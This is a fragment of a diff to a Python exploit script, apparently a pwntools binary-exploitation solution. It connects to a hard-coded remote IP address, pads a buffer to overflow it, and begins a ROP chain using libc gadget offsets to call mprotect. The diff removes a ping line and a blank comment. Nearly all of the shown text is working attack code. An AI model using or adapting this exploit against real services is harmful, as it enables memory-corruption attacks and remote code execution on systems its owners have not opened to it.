@@ -98,7 +98,6 @@ if toread > bufsiz:
     r = remote("52.20.10.244", port)
 
     buf = ""
-    buf += "ping -c 1 109.237.212.117\x00"
     buf += "A"*(bufsiz-len(buf))
 
     base = 0x400690
@@ -125,7 +124,6 @@ if toread > bufsiz:
     poprdx = p64(libc_base + 0x0009da40)
 
     # rop chain starts here
-
     # mprotect chain
     buf += poprax
     buf += p64(0xa)
